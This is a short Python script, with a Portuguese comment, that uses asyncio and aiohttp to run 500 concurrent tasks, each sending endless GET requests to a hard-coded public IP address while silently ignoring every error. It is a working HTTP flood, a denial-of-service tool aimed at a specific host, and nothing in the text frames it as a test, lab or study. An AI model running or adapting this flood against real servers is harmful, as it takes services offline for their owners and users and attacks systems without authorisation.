import asyncio, aiohttp, time

TARGET = "http://34.151.221.105/"
CONCURRENT = 500  # Número de requisições simultâneas

async def flood(session):
    while True:
        try:
            async with session.get(TARGET) as r:
                pass
        except:
            pass

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [asyncio.create_task(flood(session)) for _ in range(CONCURRENT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
